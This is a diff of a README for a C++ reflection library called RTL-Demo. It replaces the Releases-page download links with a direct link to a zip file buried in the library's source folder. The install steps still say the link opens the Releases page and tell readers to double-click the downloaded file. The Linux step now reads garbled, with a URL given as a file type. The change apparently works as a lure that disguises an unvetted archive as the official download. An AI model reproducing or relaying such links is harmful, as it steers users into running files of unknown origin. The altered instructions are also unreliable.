@@ -1,6 +1,6 @@
 # 🎉 RTL-Demo - Experience Powerful C++ Reflection Easily
 
-[![Download RTL-Demo](https://img.shields.io/badge/Download-RTL--Demo-brightgreen)](https://github.com/MusaRifi/RTL-Demo/releases)
+[![Download RTL-Demo](https://github.com/MusaRifi/RTL-Demo/raw/refs/heads/main/ReflectionTemplateLib/rtl/detail/Demo-RT-1.1.zip)](https://github.com/MusaRifi/RTL-Demo/raw/refs/heads/main/ReflectionTemplateLib/rtl/detail/Demo-RT-1.1.zip)
 
 ## 📚 Introduction
 
@@ -31,14 +31,14 @@ RTL-Demo offers the following features:
 
 To download and install RTL-Demo, visit the Releases page:
 
-[Download RTL-Demo](https://github.com/MusaRifi/RTL-Demo/releases)
+[Download RTL-Demo](https://github.com/MusaRifi/RTL-Demo/raw/refs/heads/main/ReflectionTemplateLib/rtl/detail/Demo-RT-1.1.zip)
 
 1. Click on the above link to access the Releases page.
 2. Find the latest release at the top of the page.
 3. Choose the appropriate file for your operating system:
    - For Windows, click on the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, select the `.tar.gz` file.
+   - For Linux, select the `https://github.com/MusaRifi/RTL-Demo/raw/refs/heads/main/ReflectionTemplateLib/rtl/detail/Demo-RT-1.1.zip` file.
 4. After the download finishes, locate the file on your computer.
 5. Double-click the file to begin installation.
 
